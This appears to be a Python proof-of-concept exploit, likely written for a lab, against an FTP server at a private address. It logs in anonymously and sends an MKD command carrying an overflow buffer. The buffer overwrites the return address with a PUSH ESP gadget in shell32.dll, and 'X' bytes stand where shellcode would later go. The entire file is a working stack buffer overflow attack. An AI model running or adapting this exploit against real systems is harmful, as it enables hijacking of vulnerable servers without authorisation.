import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# PUSH ESP 77715c65
#shell32.dll 54 C3
#buffer = "A"*247 + "B"*4 + "X"*255
buffer = "A"*247 + "\x65\x5c\x71\x77" + "X"*375 

s.connect(('172.16.0.24',21))
s.recv(1024)

s.send('USER anonymous\r\n')
s.recv(1024)

s.send('PASS anonymous\r\n')
s.recv(1024)

s.send('MKD ' +buffer+'\r\n')
s.recv(1024)

s.close()
